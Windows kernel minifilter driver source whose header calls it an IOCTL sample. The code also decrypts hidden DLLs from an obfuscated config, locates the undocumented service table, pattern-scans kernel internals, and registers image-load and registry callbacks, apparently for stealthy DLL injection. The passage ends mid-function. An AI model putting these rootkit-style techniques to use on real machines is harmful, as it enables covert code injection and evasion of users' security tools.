/***************************************************************************************
* AUTHOR : antireg
* DATE   : 2019-6-21
* MODULE : adsys.C
*
* Command:
*   Source of IOCTRL Sample Driver
*
* Description:
*       Demonstrates communications between USER and KERNEL.
*
****************************************************************************************
* Copyright (C) 2010 antireg.
****************************************************************************************/

//#######################################################################################
//# I N C L U D E S
//#######################################################################################

#ifndef CXX_ADSYS_H

	#include <fltKernel.h>
	#include "adsys.h"
	#include "str.h"
	#include "lde.h"
#endif

//#include "struct.h"

//////////////////////////////////////////////////////////////////////////

#ifdef ALLOC_PRAGMA
// Allow the DriverEntry routine to be discarded once initialization is completed
	#pragma alloc_text(INIT, DriverEntry)
//
	#pragma alloc_text(PAGE, DriverUnload)
	#pragma alloc_text(PAGE, DispatchCreate)
	#pragma alloc_text(PAGE, DispatchShutDown)
	#pragma alloc_text(PAGE, DispatchClose)
	#pragma alloc_text(PAGE, DispatchControl)
	#pragma alloc_text(PAGE, DispatchCommon)
	#pragma alloc_text(PAGE, InstanceSetup)
	#pragma alloc_text(PAGE, CleanVolumCtx)
	#pragma alloc_text(PAGE, InstanceQueryTeardown)
	#pragma alloc_text(PAGE, FilterUnload)

#endif // ALLOC_PRAGMA

NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryString)
{
	NTSTATUS status = STATUS_SUCCESS;

	PVOID fnExGetPreviousMode = (PVOID)ExGetPreviousMode;
	PVOID pFoundPattern = NULL;
	UCHAR PreviousModePattern[] = "\x00\x00\xC3";
	PKLDR_DATA_TABLE_ENTRY entry = NULL;
	PMY_COMMAND_INFO p1 = NULL;

	UNICODE_STRING ustrLinkName;
	UNICODE_STRING ustrDevName;
	PDEVICE_OBJECT pDevObj;
	ULONG          i = 0;
	ReadDriverParameters(pRegistryString);
	LoggingFlags = LOGFL_INFO;
	pDriverObj->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
	pDriverObj->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
	pDriverObj->MajorFunction[IRP_MJ_SHUTDOWN] = DispatchShutDown;
	// Dispatch routine for communications
	pDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchControl;


	// Unload routine
	pDriverObj->DriverUnload = DriverUnload;

	// Initialize the device name.
	RtlInitUnicodeString(&ustrDevName, NT_DEVICE_NAME);

	// Create the device object and device extension
	status = IoCreateDevice(pDriverObj, 0, &ustrDevName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pDevObj);
	if (!NT_SUCCESS(status))
	{
		dprintf("[DriverEntry] Error, IoCreateDevice = 0x%x\r\n", status);
		return status;
	}

	//// Get a pointer to our device extension
	//deviceExtension = (PDEVICE_EXTENSION) deviceObject->DeviceExtension;

	//// Save a pointer to the device object
	//deviceExtension->DeviceObject = deviceObject;

	if (IoIsWdmVersionAvailable(1, 0x10))
	{
		//如果是支持符号链接用户相关性的系统
		RtlInitUnicodeString(&ustrLinkName, SYMBOLIC_LINK_GLOBAL_NAME);
	} else
	{
		//不支持
		RtlInitUnicodeString(&ustrLinkName, SYMBOLIC_LINK_NAME);
	}

	// Create a symbolic link to allow USER applications to access it.
	status = IoCreateSymbolicLink(&ustrLinkName, &ustrDevName);

	if (!NT_SUCCESS(status))
	{
		dprintf("Error, IoCreateSymbolicLink = 0x%x\r\n", status);

		IoDeleteDevice(pDevObj);
		return status;
	}
	g_drobj = pDriverObj;
	IoRegisterShutdownNotification(pDevObj);
	
	//
	//  TODO: Add initialization code here.
	//
	LDE_init();
	//初始化字符串
	InitAllStr();


	//要保护的文件
//    InitializeListHead(&g_ProtectFile);
//    KeInitializeSpinLock(&g_spin_lockfile);
//    AppendListNode(g_HexConfig[0], &g_ProtectFile, 2);
//    AppendListNode(g_HexConfig[1], &g_ProtectFile, 1);


	wcscpy(g_pProtectFile[0].exename, g_HexConfig[0]);
	g_pProtectFile[0].uType = 2;

	wcscpy(g_pProtectFile[1].exename, g_HexConfig[1]);
	g_pProtectFile[1].uType = 1;


//  kprintf("[DriverEntry] g_pProtectFile size:%d",sizeof(g_pProtectFile));
	//不让访问的进程名

#ifdef _AMD64_
	//x64 add code
	status = MzReadFile(g_HexConfig[2], &g_pDll64, &g_iDll64);
	if (NT_SUCCESS(status))
	{
		MyDecryptFile(g_pDll64, g_iDll64, 16);
	} else kprintf("[DriverEntry] File:%ws Error status:%x", g_HexConfig[2], status);

	status = MzReadFile(g_HexConfig[3], &g_pDll32, &g_iDll32);
	if (NT_SUCCESS(status))
	{
		MyDecryptFile(g_pDll32, g_iDll32, 16);
	} else kprintf("[DriverEntry] File:%ws Error status:%x", g_HexConfig[3], status);

#else
	//x86 add code
	status = MzReadFile(g_HexConfig[3], &g_pDll32, &g_iDll32);
	if (NT_SUCCESS(status))
	{
		MyDecryptFile(g_pDll32, g_iDll32, 16);
	} else kprintf("[DriverEntry] File:%ws Error status:%x", g_HexConfig[3], status);
#endif

	kprintf("[DriverEntry] g_pDll64:%p g_iDll64:%x g_pDll32:%p g_iDll32:%x", g_pDll64, g_iDll64, g_pDll32, g_iDll32);

#ifdef _AMD64_
	KeServiceDescriptorTable = (PServiceDescriptorTableEntry_t)GetKeServiceDescriptorTable64();
#else
#endif

	kprintf("[DriverEntry] KeServiceDescriptorTable:%p", KeServiceDescriptorTable);
	PsGetProcessWow64Process = (P_PsGetProcessWow64Process)GetSystemRoutineAddress(L"PsGetProcessWow64Process");
	PsGetProcessPeb = (P_PsGetProcessPeb)GetSystemRoutineAddress(L"PsGetProcessPeb");
	DbgPrint("[DriverEntry] PsGetProcessPeb:%p   PsGetProcessWow64Process:%p", PsGetProcessPeb, PsGetProcessWow64Process);
	if (NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern)))
	{
		g_mode = *(PULONG)((PUCHAR)pFoundPattern - 2);
		kprintf("[DriverEntry] g_mode:%x fnExGetPreviousMode:%p\n", g_mode, fnExGetPreviousMode);
	}

	kprintf("[DriverEntry] PsGetProcessImageFileName:%p", PsGetProcessImageFileName);

	// 映像加载回调
	status = PsSetLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
	if (!NT_SUCCESS(status))
	{
		kprintf("[DriverEntry] PsSetLoadImageNotifyRoutine Failed! status:%x\n", status);
	}

	//注册表回调监控
	SetRegisterCallback();
	//文件回调监控
	ExInitializeNPagedLookasideList(&Pre2PostContextList, NULL, NULL, 0, sizeof(PRE_2_POST_CONTEXT), PRE_2_POST_TAG, 0);
	status = FltRegisterFilter(pDriverObj, &FilterRegistration, &gFilterHandle);
	ASSERT(NT_SUCCESS(status));
	if (NT_SUCCESS(status))
	{
		//
		//  Start filtering i/o
		//
		status = FltStartFiltering(gFilterHandle);
		if (!NT_SUCCESS(status))
		{
			FltUnregisterFilter(gFilterHandle);
		}
	}
	return STATUS_SUCCESS;
}

VOID DriverUnload(IN PDRIVER_OBJECT pDriverObj)
{
	UNICODE_STRING strLink;

	// Unloading - no resources to free so just return.
	dprintf("Unloading...\r\n");
	;

	//
	// TODO: Add uninstall code here.
	//
	PsRemoveLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
	RemoveRegisterCallback();
	// Delete the symbolic link
	RtlInitUnicodeString(&strLink, SYMBOLIC_LINK_NAME);
	IoDeleteSymbolicLink(&strLink);

	// Delete the DeviceObject
	IoDeleteDevice(pDriverObj->DeviceObject);

	dprintf("Unloaded Success\r\n");

	return;
}

NTSTATUS DispatchCreate(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
{
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;

	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

NTSTATUS DispatchClose(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
{
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;

	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	// Return success
	return STATUS_SUCCESS;
}

NTSTATUS DispatchCommon(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
{
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0L;
	IoCompleteRequest(pIrp, 0);
	// Return success
	return STATUS_SUCCESS;
}

NTSTATUS DispatchControl(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
{
	NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST; // STATUS_UNSUCCESSFUL
	PIO_STACK_LOCATION pIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	ULONG uIoControlCode = 0;
	PVOID pIoBuffer = NULL;
	ULONG uInSize = 0;
	ULONG uOutSize = 0;

	// Get the IoCtrl Code
	uIoControlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
	pIoBuffer = pIrp->AssociatedIrp.SystemBuffer;
	uInSize = pIrpStack->Parameters.DeviceIoControl.InputBufferLength;
	uOutSize = pIrpStack->Parameters.DeviceIoControl.OutputBufferLength;

	switch (uIoControlCode)
	{
	case IOCTL_HELLO_WORLD:
		{
			dprintf("MY_CTL_CODE(0)=%d\r\n,MY_CTL_CODE");
			// Return success
			status = STATUS_SUCCESS;
		}
		break;
	case IOCTRL_DEBUG:
		{
			int *pFlag = pIoBuffer;
			if (MmIsAddressValid(pFlag))
			{
				kprintf("[DispatchControl] ...%d uInSize:%d", *pFlag, uInSize);
				

				LoggingFlags = *pFlag;
			}

		}
		break;

		//
		// TODO: Add execute code here.
		//
	default:
		{

			status = STATUS_INVALID_PARAMETER;
		}
		break;
	}

	if (status == STATUS_SUCCESS)
	{
		
		pIrp->IoStatus.Information = uOutSize;

	} else
	{
		pIrp->IoStatus.Information = 0;
	}

	// Complete the I/O Request
	pIrp->IoStatus.Status = status;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return status;
}

//
// TODO: Add your module definitions here.
//

NTSTATUS FilterUnload(__in FLT_FILTER_UNLOAD_FLAGS Flags)
{
	UNREFERENCED_PARAMETER(Flags);

	//
	//  Unregister from FLT mgr
	FltUnregisterFilter(gFilterHandle);
	//  Delete lookaside list
	ExDeleteNPagedLookasideList(&Pre2PostContextList);
	kprintf("[FilterUnload] call ExDeleteNPagedLookasideList FltUnregisterFilter");

	return STATUS_SUCCESS;
}






BOOLEAN GetCommandLine(PEPROCESS ProcessObj, WCHAR name[])
{
	PPEB pPEB = NULL;
	UNREFERENCED_PARAMETER(name);
	pPEB = PsGetProcessPeb != NULL ? PsGetProcessPeb(ProcessObj) : NULL;
	if (pPEB == NULL) return FALSE;
#ifdef _AMD64_

	try
	{
		PPEB64 peb64 = (PPEB64)pPEB;
		ULONG64 p1 = 0;
		ULONG64 uCommandline = 0;
		ULONG64 uImagepath = 0;
		ULONG type = 0;
		PUNICODE_STRING pCommandline = NULL;
		UNICODE_STRING pImagePath = { 0 };
		UNICODE_STRING tempcommand = { 0 };
		PRTL_USER_PROCESS_PARAMETERS64 processParam = (PRTL_USER_PROCESS_PARAMETERS64)peb64->ProcessParameters;
//      kprintf("[GetCommandLine] CommandLine Length:%d %ws",processParam->CommandLine.Length,processParam->CommandLine.Buffer);
		if (MmIsAddressValid(processParam) == FALSE || processParam->CommandLine.Length > 2048)
		{
			return FALSE;
		}
		if (MmIsAddressValid(processParam->CommandLine.Buffer))
		{
			int Len = processParam->CommandLine.Length >= 1024 ? 1023 : processParam->CommandLine.Length;
			RtlCopyMemory(name, processParam->CommandLine.Buffer, Len);
			return TRUE;
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		ULONG code = GetExceptionCode();
		//      kprintf("[GetProcessNameByObj] this is __except");
	}

#else

	try
	{

		PPEB32 peb32 = (PPEB32)pPEB;
		ULONG32 p1 = 0;
		ULONG32 uCommandline = 0;
		ULONG32 uImagepath = 0;
		ULONG type = 0;
		PUNICODE_STRING32 pCommandline = NULL;
		UNICODE_STRING32 pImagePath = { 0 };
		UNICODE_STRING32 tempcommand;
		ULONG ImageBuffeLen = 259;
		WCHAR *pImageBuffer = NULL;
		PRTL_USER_PROCESS_PARAMETERS32 processParam = NULL;
		if (pPEB == NULL) return FALSE;

		processParam = (PRTL_USER_PROCESS_PARAMETERS32)peb32->ProcessParameters;
//      kprintf("[GetCommandLine] Length:%d ProcessParameters:%ws", processParam->CommandLine.Length, processParam->CommandLine.Buffer);
		if (MmIsAddressValid(processParam) == FALSE || processParam->CommandLine.Length > 2048)
		{
			return FALSE;
		}

		if (MmIsAddressValid(processParam->CommandLine.Buffer))
		{
			int Len = processParam->CommandLine.Length >= 1024 ? 1023 : processParam->CommandLine.Length;
			RtlCopyMemory(name, processParam->CommandLine.Buffer, Len);
			return TRUE;

		}

	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		ULONG code = GetExceptionCode();
	}

#endif
	return FALSE;
}










BOOLEAN GetProcessNameByObj(PEPROCESS ProcessObj, WCHAR *name)
{
	PPEB pPEB = NULL;

	KPROCESSOR_MODE  PreMode = ExGetPreviousMode();
	if (KeGetCurrentIrql() != PASSIVE_LEVEL)
	{

		//LOG(LOGFL_INFO,("this is less level"));

		ANSI_STRING AnsiString2;
		UNICODE_STRING UnicodeString2;
		CHAR *pData = PsGetProcessImageFileName(ProcessObj);
		CHAR pname[216] = { 0 };
		WCHAR pexe[512] = { 0 };
		NTSTATUS  status = -1;
		kprintf("[GetProcessNameByObj] this is less level");
		strcpy(pname, pData);
		RtlInitString(&AnsiString2, pname);
		status = RtlAnsiStringToUnicodeString(&UnicodeString2, &AnsiString2, TRUE);

		if (NT_SUCCESS(status))
		{
			wcscpy(name, UnicodeString2.Buffer);
			RtlFreeUnicodeString(&UnicodeString2);
			return TRUE;
		}
		return FALSE;
	}


	pPEB = PsGetProcessPeb != NULL ? PsGetProcessPeb(ProcessObj) : NULL;
	if (pPEB == NULL) return FALSE;
#ifdef _AMD64_

	try
	{
		PPEB64 peb64 = (PPEB64)pPEB;
		ULONG64 p1 = 0;
		ULONG64 uCommandline = 0;
		ULONG64 uImagepath = 0;
		ULONG type = 0;
		PUNICODE_STRING pCommandline = NULL;
		UNICODE_STRING pImagePath = { 0 };
		UNICODE_STRING tempcommand = { 0 };
		WCHAR pexe[512] = { 0 };
		PRTL_USER_PROCESS_PARAMETERS64 processParam = (PRTL_USER_PROCESS_PARAMETERS64)peb64->ProcessParameters;
		//kprintf("[GetProcessNameByObj] ImagePathName:%ws",processParam->ImagePathName.Buffer);
		if (MmIsAddressValid(processParam) == FALSE || processParam->ImagePathName.Length > 512)
		{
			return FALSE;
		}
		if (MmIsAddressValid(processParam->ImagePathName.Buffer))
		{

			WCHAR *pfind = NULL;
			WCHAR *pexefind = NULL;
			RtlCopyMemory(pexe, (void *)processParam->ImagePathName.Buffer, processParam->ImagePathName.Length);
			pfind = wcsrchr(pexe, L'\\');
			if (pfind)
			{
				pfind++;
				wcscpy(name, pfind);
				return TRUE;
			}
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		ULONG code = GetExceptionCode();
		//      kprintf("[GetProcessNameByObj] this is __except");
	}

#else

	try
	{

		PPEB32 peb32 = (PPEB32)pPEB;
		ULONG32 p1 = 0;
		ULONG32 uCommandline = 0;
		ULONG32 uImagepath = 0;
		ULONG type = 0;
		PUNICODE_STRING32 pCommandline = NULL;
		UNICODE_STRING32 pImagePath = { 0 };
		UNICODE_STRING32 tempcommand;
		WCHAR pexe[512] = { 0 };

		ULONG ImageBuffeLen = 259;
		WCHAR *pImageBuffer = NULL;
		PRTL_USER_PROCESS_PARAMETERS32 processParam = NULL;
		if (pPEB == NULL) return FALSE;

		processParam = (PRTL_USER_PROCESS_PARAMETERS32)peb32->ProcessParameters;

		if (MmIsAddressValid(processParam) == FALSE)
		{
			return FALSE;
		}

		pImageBuffer = processParam->ImagePathName.Buffer;
		ImageBuffeLen = processParam->ImagePathName.Length;

		if (MmIsAddressValid((PVOID)pImageBuffer) && ImageBuffeLen < 512)
		{
			WCHAR *pfind = NULL;
			RtlCopyMemory(pexe, (void *)pImageBuffer, ImageBuffeLen);
			pfind = wcsrchr(pexe, L'\\');
			if (pfind)
			{
				pfind++;
				wcscpy(name, pfind);
				_wcslwr(name, wcslen(name));
				return TRUE;
			}
		} else
		{
			ULONG_PTR pexebuf = (ULONG_PTR)pImageBuffer + (ULONG_PTR)processParam;
			if (MmIsAddressValid((PVOID)pexebuf))
			{
				WCHAR *pfind = NULL;
				RtlCopyMemory(pexe, (PVOID)pexebuf, ImageBuffeLen);
				pfind = wcsrchr(pexe, L'\\');
				if (pfind)
				{
					pfind++;
					wcscpy(name, pfind);
					_wcslwr(name, wcslen(name));
					return TRUE;
				}
			}
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		ULONG code = GetExceptionCode();
	}

#endif
	return FALSE;
}

VOID CleanVolumCtx(
	IN PFLT_CONTEXT Context,
	IN FLT_CONTEXT_TYPE ContextType)
/*++

Routine Description:

	The given context is being freed.
	Free the allocated name buffer if there one.

Arguments:

	Context - The context being freed

	ContextType - The type of context this is

Return Value:

	None

--*/
{
	PVOLUME_CONTEXT ctx = NULL;
	PSTREAM_CONTEXT streamCtx = NULL;
	PAGED_CODE();
	UNREFERENCED_PARAMETER(ContextType);
	switch (ContextType)
	{
	case FLT_VOLUME_CONTEXT:
		{

			ctx = (PVOLUME_CONTEXT)Context;
			if (ctx->Name.Buffer != NULL)
			{

				//                kprintf("[CleanVolumCtx] free volumName:%wZ",&ctx->Name);
				ExFreePool(ctx->Name.Buffer);
				ctx->Name.Buffer = NULL;
			}
		}
		break;
	case FLT_STREAM_CONTEXT:
		{
			KIRQL OldIrql;
			streamCtx = (PSTREAM_CONTEXT)Context;

			if (streamCtx == NULL) break;
			if (streamCtx->FileName.Buffer != NULL)
			{

				//                kprintf("[CleanVolumCtx] free streamcontext FileName:%ws",streamCtx->FileName.Buffer);
				ExFreePoolWithTag(streamCtx->FileName.Buffer, STRING_TAG);
				streamCtx->FileName.Length = streamCtx->FileName.MaximumLength = 0;
				streamCtx->FileName.Buffer = NULL;
			}

			if (NULL != streamCtx->Resource)
			{
				ExDeleteResourceLite(streamCtx->Resource);
				ExFreePoolWithTag(streamCtx->Resource, RESOURCE_TAG);
			}
		}
		break;
	}
}

NTSTATUS InstanceSetup(
	IN PCFLT_RELATED_OBJECTS FltObjects,
	IN FLT_INSTANCE_SETUP_FLAGS Flags,
	IN DEVICE_TYPE VolumeDeviceType,
	IN FLT_FILESYSTEM_TYPE VolumeFilesystemType)
/*++

Routine Description:

	This routine is called whenever a new instance is created on a volume.

	By default we want to attach to all volumes.  This routine will try and
	get a "DOS" name for the given volume.  If it can't, it will try and
	get the "NT" name for the volume (which is what happens on network
	volumes).  If a name is retrieved a volume context will be created with
	that name.

Arguments:

	FltObjects - Pointer to the FLT_RELATED_OBJECTS data structure containing
	opaque handles to this filter, instance and its associated volume.

	Flags - Flags describing the reason for this attach request.

Return Value:

	STATUS_SUCCESS - attach
	STATUS_FLT_DO_NOT_ATTACH - do not attach

--*/
{
	PDEVICE_OBJECT devObj = NULL;
	PVOLUME_CONTEXT ctx = NULL;
	NTSTATUS status;
	ULONG retLen;
	PUNICODE_STRING workingName;
	USHORT size;
	UCHAR volPropBuffer[sizeof(FLT_VOLUME_PROPERTIES) + 512];
	PFLT_VOLUME_PROPERTIES volProp = (PFLT_VOLUME_PROPERTIES)volPropBuffer;

	UNREFERENCED_PARAMETER(Flags);
	UNREFERENCED_PARAMETER(VolumeDeviceType);
	UNREFERENCED_PARAMETER(VolumeFilesystemType);

	try
	{

		//
		//  Allocate a volume context structure.
		//

		status = FltAllocateContext(FltObjects->Filter, FLT_VOLUME_CONTEXT, sizeof(VOLUME_CONTEXT), NonPagedPool, &ctx);
		if (!NT_SUCCESS(status))
		{
			//  We could not allocate a context, quit now
			leave;
		}
		//
		//  Always get the volume properties, so I can get a sector size
		//

		status = FltGetVolumeProperties(FltObjects->Volume, volProp, sizeof(volPropBuffer), &retLen);
		if (!NT_SUCCESS(status))
		{
			leave;
		}

		//
		//  Save the sector size in the context for later use.  Note that
		//  we will pick a minimum sector size if a sector size is not
		//  specified.
		//

		ASSERT((volProp->SectorSize == 0) || (volProp->SectorSize >= MIN_SECTOR_SIZE));

		ctx->SectorSize = max(volProp->SectorSize, MIN_SECTOR_SIZE);

		//
		//  Init the buffer field (which may be allocated later).
		//

		ctx->Name.Buffer = NULL;

		//
		//  Get the storage device object we want a name for.
		//

		status = FltGetDiskDeviceObject(FltObjects->Volume, &devObj);

		if (NT_SUCCESS(status))
		{

			//
			//  Try and get the DOS name.  If it succeeds we will have
			//  an allocated name buffer.  If not, it will be NULL
			//

			status = IoVolumeDeviceToDosName(devObj, &ctx->Name);
		}

		//
		//  If we could not get a DOS name, get the NT name.
		//

		if (!NT_SUCCESS(status))
		{
			ASSERT(ctx->Name.Buffer == NULL);
			status = STATUS_FLT_DO_NOT_ATTACH;
			leave;
		}

		//
		//  Set the context
		//

		kprintf("[InstanceSetup] Volume Name:%wZ", &ctx->Name);
		status = FltSetVolumeContext(FltObjects->Volume,
									 FLT_SET_CONTEXT_KEEP_IF_EXISTS,
									 ctx,
									 NULL);
		if (status == STATUS_FLT_CONTEXT_ALREADY_DEFINED)
		{

			status = STATUS_SUCCESS;
		}
	}
	finally
	{

		//
		//  Always release the context.  If the set failed, it will free the
		//  context.  If not, it will remove the reference added by the set.
		//  Note that the name buffer in the ctx will get freed by the context
		//  cleanup routine.
		//

		if (ctx)
		{

			FltReleaseContext(ctx);

		}

		//
		//  Remove the reference added to the device object by
		//  FltGetDiskDeviceObject.
		//

		if (devObj)
		{
			ObDereferenceObject(devObj);
		}
	}

	return status;
}

/**
 * [InstanceQueryTeardown This is called when an instance is being manually deleted by a call to FltDetachVolume or FilterDetach.  We always return it is OK to detach]
 * @Author   fanyusen
 * @DateTime 2019年6月18日T7:23:53+0800
 * @param    FltObjects               [Pointer to the FLT_RELATED_OBJECTS data structure containing opaque handles to this filter, instance and its associated volume.]
 * @param    Flags                    [Indicating where this detach request came from.]
 * @return                            [Always succeed]
 */
NTSTATUS InstanceQueryTeardown(IN PCFLT_RELATED_OBJECTS FltObjects, IN FLT_INSTANCE_QUERY_TEARDOWN_FLAGS Flags)
{
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(Flags);
	return STATUS_SUCCESS;
}

FLT_PREOP_CALLBACK_STATUS PreCleanup(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__deref_out_opt PVOID *CompletionContext)
{
	NTSTATUS status = STATUS_SUCCESS;
	PFLT_FILE_NAME_INFORMATION pfNameInfo = NULL;
	PSTREAM_CONTEXT pStreamCtx = NULL;
	LARGE_INTEGER FileOffset = { 0 };
	BOOLEAN bIsSystemProcess = FALSE;
	BOOLEAN bFileNameLengthNotZero = FALSE;
	KIRQL OldIrql;
	PVOLUME_CONTEXT pVolCtx = NULL;
	BOOLEAN bDirectory = FALSE;
	UNREFERENCED_PARAMETER(CompletionContext);
	PAGED_CODE();
	try
	{
		//get volume context锛?remember to release volume context before return
		status = FltGetVolumeContext(FltObjects->Filter, FltObjects->Volume, &pVolCtx);
		if (!NT_SUCCESS(status) || (NULL == pVolCtx))
		{
			__leave;
		}

		// retrieve stream context
		status = Ctx_FindOrCreateStreamContext(Data, FltObjects, FALSE, &pStreamCtx, NULL);
		if (!NT_SUCCESS(status))
		{
			__leave;
		}

		//DbgPrint("PreCleanup %wZ",&pStreamCtx->FileName);
		//get file full path(such as \Device\HarddiskVolumeX\test\1.txt)
		status = FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT, &pfNameInfo);
		if (!NT_SUCCESS(status))
		{
			__leave;
		}
		if (0 != pfNameInfo->Name.Length)
		{
			// file name length is zero

			// verify file attribute. If directory, pass down directly
			GetFileStandardInfo(Data, FltObjects, NULL, NULL, &bDirectory);
			if (bDirectory)
			{
				__leave;
			}

			//            DbgPrint("[PreCleanup] call Cc_ClearFileCache");
			Cc_ClearFileCache(FltObjects->FileObject, TRUE, NULL, 0); // flush and purge cache
		}
	}
	finally
	{

		if (NULL != pVolCtx) FltReleaseContext(pVolCtx);
		if (NULL != pStreamCtx) FltReleaseContext(pStreamCtx);
		if (NULL != pfNameInfo) FltReleaseFileNameInformation(pfNameInfo);
	}

	return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

FLT_PREOP_CALLBACK_STATUS PreClose(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__deref_out_opt PVOID *CompletionContext)
{
	NTSTATUS status = STATUS_SUCCESS;
	FLT_PREOP_CALLBACK_STATUS FltStatus = FLT_PREOP_SUCCESS_NO_CALLBACK;

	PSTREAM_CONTEXT pStreamCtx = NULL;
	PVOLUME_CONTEXT pVolCtx = NULL;

	BOOLEAN bDeleteStreamCtx = FALSE;

	OBJECT_ATTRIBUTES ob;
	IO_STATUS_BLOCK IoStatus;
	HANDLE hFile = NULL;
	UNICODE_STRING sFileDosFullPath;
	WCHAR wszFileDosFullPath[260];
	PWCHAR pszRelativePathPtr = NULL;
	WCHAR wszFilePathName[260] = { 0 };
	WCHAR wszVolumePathName[64] = { 0 };
	PFILE_OBJECT FileObject = NULL;

	KIRQL OldIrql;
	BOOLEAN bDirectory = FALSE;
	BOOLEAN bIsSystemProcess = FALSE;

	UNREFERENCED_PARAMETER(CompletionContext);

	PAGED_CODE(); //comment this line to avoid IRQL_NOT_LESS_OR_EQUAL error when accessing stream context

	try
	{

		// verify file attribute, if directory, pass down directly
		GetFileStandardInfo(Data, FltObjects, NULL, NULL, &bDirectory);
		if (bDirectory)
		{
			__leave;
		}

		// retireve volume context
		status = FltGetVolumeContext(FltObjects->Filter, FltObjects->Volume, &pVolCtx);
		if (!NT_SUCCESS(status))
		{
			__leave;
		}

		// retrieve stream context
		status = Ctx_FindOrCreateStreamContext(Data, FltObjects, FALSE, &pStreamCtx, NULL);
		if (!NT_SUCCESS(status))
		{
			__leave;
		}

		SC_LOCK(pStreamCtx, &OldIrql);
		// if it is a stream file object, we don't care about it and don't decrement on reference count
		// since this object is opened by other kernel component
		if ((FltObjects->FileObject->Flags & FO_STREAM_FILE) != FO_STREAM_FILE) pStreamCtx->RefCount--; // decrement reference count

		if (0 == pStreamCtx->RefCount)
		{
			//if reference decreases to 0, write file flag, flush|purge cache, and delete file context
			//            DbgPrint("[PreClose]  RefCount:%d",pStreamCtx->RefCount);
			Cc_ClearFileCache(FileObject, TRUE, NULL, 0);
		}
		SC_UNLOCK(pStreamCtx, OldIrql);
	}
	finally
	{

		if (NULL != pStreamCtx) FltReleaseContext(pStreamCtx);
		if (NULL != pVolCtx) FltReleaseContext(pVolCtx);
	}

	return FltStatus;
}

/*************************************************************************
	dispatch callback routines.
*************************************************************************/
FLT_PREOP_CALLBACK_STATUS PreCreate(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__deref_out_opt PVOID *CompletionContext)
{
	FLT_PREOP_CALLBACK_STATUS FltStatus = FLT_PREOP_SUCCESS_WITH_CALLBACK;
	WCHAR fitername[256] = { 0 };
	WCHAR exename[216] = { 0 };
	PFLT_FILE_NAME_INFORMATION pfNameInfo = NULL;
	ULONG ilen = 0;
	NTSTATUS status;
	UNREFERENCED_PARAMETER(CompletionContext);
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(Data);
	PAGED_CODE();

	return FltStatus; //FLT_PREOP_SUCCESS_WITH_CALLBACK;
}

FLT_POSTOP_CALLBACK_STATUS PostCreate(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__inout_opt PVOID CompletionContext,
	__in FLT_POST_OPERATION_FLAGS Flags)
{
	NTSTATUS status = STATUS_SUCCESS;

	ULONG uDesiredAccess = Data->Iopb->Parameters.Create.SecurityContext->DesiredAccess; //get desired access mode
	PVOLUME_CONTEXT pVolCtx = NULL;
	PFLT_FILE_NAME_INFORMATION pfNameInfo = NULL;
	PSTREAM_CONTEXT pStreamCtx = NULL;
	BOOLEAN bNewCreatedOrNot = FALSE;
	WCHAR fitername[512] = { 0 };
	BOOLEAN bDirectory = FALSE;
	KIRQL OldIrql;
	PMY_COMMAND_INFO pCmdData = NULL;
	UNREFERENCED_PARAMETER(Flags);
	UNREFERENCED_PARAMETER(CompletionContext);

	PAGED_CODE();

	try
	{

		//get file full path(such as \Device\HarddiskVolumeX\test\1.txt)
		status = FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT, &pfNameInfo);
		if (!NT_SUCCESS(status))
		{
			__leave;
		}
		//verify if a directory
		GetFileStandardInfo(Data, FltObjects, NULL, NULL, &bDirectory);
		if (bDirectory)
		{
			// open/create a directory, just pass
			__leave;
		}

		GetNameByUnicodeString(&pfNameInfo->Name, fitername);

		pCmdData = FindInProtectFile(fitername);
		if (pCmdData == NULL)
		{
			__leave;
		}


//      LOG(LOGFL_INFO,("[PostCreate] filename:%ws uType:%d Path:%wZ",pCmdData->exename,pCmdData->uType,&pfNameInfo->Name));


		status = Ctx_FindOrCreateStreamContext(Data, FltObjects, TRUE,
											   &pStreamCtx, &bNewCreatedOrNot);
		if (!NT_SUCCESS(status))
		{
			__leave;
		}

		//update file path name in stream context
		Ctx_UpdateNameInStreamContext(&pfNameInfo->Name, pStreamCtx);

		if (!bNewCreatedOrNot)
		{
